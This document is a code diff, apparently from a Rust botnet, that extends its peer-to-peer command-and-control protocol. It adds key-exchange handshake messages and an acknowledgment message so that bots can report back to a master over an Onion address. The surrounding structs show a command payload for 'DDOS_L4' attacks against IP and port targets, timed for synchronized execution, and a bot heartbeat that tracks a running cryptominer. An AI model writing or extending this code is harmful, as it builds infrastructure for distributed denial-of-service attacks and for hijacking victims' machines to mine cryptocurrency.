@@ -15,6 +15,11 @@ pub enum MeshMsg {
     /// Bootstrap -> Node: "Here are some peers"
     Peers(Vec<PeerInfo>),
     
+    /// Handshake Step 1: Initiator sends Ephemeral PubKey
+    ClientHello { ephemeral_pub: String },
+    /// Handshake Step 2: Responder sends Ephemeral PubKey
+    ServerHello { ephemeral_pub: String },
+    
     /// Node <-> Node / Ghost -> Node: "Broadcast this command"
     Gossip(GossipMsg),
     
@@ -22,6 +27,9 @@ pub enum MeshMsg {
     FindBot { target_id: String },
     /// Node -> Node: "Yes, I know these closest nodes"
     FoundBot { nodes: Vec<PeerInfo> },
+    
+    /// Bot -> Master: "Command Executed"
+    Ack(AckPayload),
 }
 
 #[derive(Serialize, Deserialize, Debug, Clone)]
@@ -62,6 +70,7 @@ pub struct CommandPayload {
     pub action: String,     // e.g. "DDOS_L4"
     pub parameters: String, // e.g. "1.1.1.1|80|... "
     pub execute_at: i64,    // Unix Timestamp for synchronized attack
+    pub reply_to: Option<String>, // Optional: Master's Onion for Ack
 }
 
 /// Bot Status Report (Heartbeat) - NOT YET SIGNED in this version, just informational
@@ -73,6 +82,13 @@ pub struct BotStatus {
     pub version: String,
     pub miner_running: bool,
     pub mesh_health: f32,
+}
+
+#[derive(Serialize, Deserialize, Debug, Clone)]
+pub struct AckPayload {
+    pub command_id: String,
+    pub status: String, // "Executed", "Failed"
+    pub details: String,
 }
 
 impl GhostPacket {
